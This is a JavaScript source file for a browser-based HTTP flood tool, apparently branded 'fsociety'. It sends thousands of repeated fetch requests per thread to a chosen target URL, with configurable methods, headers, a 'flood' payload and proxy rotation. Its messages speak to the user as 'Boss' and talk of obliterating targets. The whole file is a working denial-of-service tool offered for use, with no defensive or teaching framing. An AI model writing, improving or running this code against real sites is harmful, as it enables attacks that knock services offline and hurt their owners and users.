let config = {
    defaultTarget: "https://example.com",
    defaultRequests: 10000,
    defaultThreads: 10,
    defaultDelay: 10,
    defaultMethod: "GET",
    defaultUserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    defaultHeaders: {},
    defaultPayload: '{"flood": "data"}',
    defaultProxies: [],
    attackInterval: 10,
    maxLogEntries: 100
};

let intervals = []; // To stop attacks

if (localStorage.getItem('fsocietyConfig')) {
    config = JSON.parse(localStorage.getItem('fsocietyConfig'));
}

document.getElementById('targetUrl').value = config.defaultTarget;
document.getElementById('requestCount').value = config.defaultRequests;
document.getElementById('threads').value = config.defaultThreads;
document.getElementById('delay').value = config.defaultDelay;
document.getElementById('method').value = config.defaultMethod;
document.getElementById('userAgent').value = config.defaultUserAgent;
document.getElementById('headers').value = JSON.stringify(config.defaultHeaders, null, 2);
document.getElementById('payload').value = config.defaultPayload;
document.getElementById('proxies').value = config.defaultProxies.join(', ');

function toggleConfigEditor() {
    const editor = document.getElementById('configEditor');
    const jsonArea = document.getElementById('configJson');
    editor.style.display = editor.style.display === 'none' ? 'block' : 'none';
    jsonArea.value = JSON.stringify(config, null, 2);
}

function saveConfig() {
    const jsonArea = document.getElementById('configJson');
    try {
        config = JSON.parse(jsonArea.value);
        localStorage.setItem('fsocietyConfig', JSON.stringify(config));
        document.getElementById('targetUrl').value = config.defaultTarget;
        document.getElementById('requestCount').value = config.defaultRequests;
        document.getElementById('threads').value = config.defaultThreads;
        document.getElementById('delay').value = config.defaultDelay;
        document.getElementById('method').value = config.defaultMethod;
        document.getElementById('userAgent').value = config.defaultUserAgent;
        document.getElementById('headers').value = JSON.stringify(config.defaultHeaders, null, 2);
        document.getElementById('payload').value = config.defaultPayload;
        document.getElementById('proxies').value = config.defaultProxies.join(', ');
        alert("Config saved, Boss. Hell's reloaded.");
    } catch (e) {
        alert("Bad JSON, Boss—fix that crap.");
    }
    toggleConfigEditor();
}

function startAttack() {
    const targetUrl = document.getElementById('targetUrl').value;
    const requestCount = parseInt(document.getElementById('requestCount').value);
    const threads = parseInt(document.getElementById('threads').value);
    const delay = parseInt(document.getElementById('delay').value);
    const method = document.getElementById('method').value;
    const userAgent = document.getElementById('userAgent').value;
    let headers = {};
    try {
        headers = JSON.parse(document.getElementById('headers').value);
    } catch (e) {
        alert("Bad headers JSON, Boss—defaulting to empty.");
    }
    const payload = document.getElementById('payload').value;
    const proxies = document.getElementById('proxies').value.split(',').map(p => p.trim()).filter(p => p);
    const targetDisplay = document.getElementById('targetDisplay');
    const requestDisplay = document.getElementById('requestDisplay');
    const requestLog = document.getElementById('requestLog');
    const status = document.getElementById('status');

    if (!targetUrl) {
        alert("Need a target to obliterate, Boss!");
        return;
    }

    targetDisplay.textContent = targetUrl;
    requestDisplay.textContent = requestCount * threads;
    status.textContent = "Attack in progress...";
    requestLog.innerHTML = '';
    let logCount = 0;

    intervals = []; // Reset intervals

    for (let t = 0; t < threads; t++) {
        let threadCount = 0;
        const interval = setInterval(async () => {
            if (threadCount >= requestCount) {
                clearInterval(interval);
                return;
            }

            const proxy = proxies.length ? proxies[Math.floor(Math.random() * proxies.length)] : null;
            const requestNum = ++logCount;
            const timestamp = new Date().toISOString();
            const logEntry = document.createElement('li');
            logEntry.textContent = `[${timestamp}] [Thread ${t+1}] [${requestNum}] Request sent via ${method} (${proxy || 'Direct'})`;

            try {
                let fetchOptions = {
                    method: method,
                    mode: 'no-cors',
                    cache: 'no-cache',
                    credentials: 'omit',
                    headers: {
                        'User-Agent': userAgent || config.defaultUserAgent,
                        ...headers
                    }
                };

                if (method === 'POST' || method === 'PUT') {
                    fetchOptions.body = payload;
                }

                if (proxy) {
                    // Note: Browser fetch doesn't support proxies natively; use a proxy service or server-side for real proxies
                    logEntry.textContent += ' (Proxy sim - use server for full)';
                }

                await fetch(targetUrl, fetchOptions);
                logEntry.textContent += ' - SUCCESS';
            } catch (e) {
                logEntry.textContent += ` - ERROR: ${e.message}`;
            }

            requestLog.appendChild(logEntry);
            requestLog.scrollTop = requestLog.scrollHeight;
            threadCount++;

            if (logCount >= config.maxLogEntries) {
                requestLog.removeChild(requestLog.firstChild);
            }
        }, delay);

        intervals.push(interval);
    }

    console.log(`Flooding ${targetUrl} with ${threads} threads, ${requestCount} reqs each. Method: ${method}. Buckle up, Boss.`);
}

function stopAttack() {
    intervals.forEach(clearInterval);
    document.getElementById('status').textContent = "Attack stopped. Ready for next.";
    alert("Attack halted, Boss.");
}
